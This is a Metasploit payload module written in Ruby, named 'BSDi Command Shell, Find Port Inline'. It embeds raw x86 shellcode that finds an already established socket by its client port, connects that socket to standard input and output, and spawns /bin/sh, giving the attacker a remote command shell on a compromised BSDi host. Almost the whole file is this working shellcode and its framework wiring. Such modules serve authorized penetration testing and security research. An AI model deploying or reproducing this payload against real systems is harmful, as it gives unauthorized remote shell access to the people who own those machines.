##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/find_port'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'BSDi Command Shell, Find Port Inline',
      'Description'   => 'Spawn a shell on an established connection',
      'Author'        => [ 'skape', 'optyx' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'bsdi',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::FindPort,
      'Session'       => Msf::Sessions::CommandShell,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'CPORT' => [ 41, 'n' ],
            },
          'Payload' =>
            "\x68\x00\x07\x00\xc3\xb8\x9a\x00\x00\x00\x99\x50\x89\xe7\x31\xf6" +
            "\x83\xec\x10\x89\xe1\x6a\x10\x89\xe3\x46\x6a\x1f\x58\x53\x51\x56" +
            "\xff\xd7\x83\xc4\x0c\x66\x81\x79\x02\x11\x5c\x75\xec\x6a\x02\x59" +
            "\xb0\x5a\x51\x56\xff\xd7\x49\x79\xf7\x50\x68\x2f\x2f\x73\x68\x68" +
            "\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\xb0\x3b\xff\xd7"
        }
      ))
  end

end
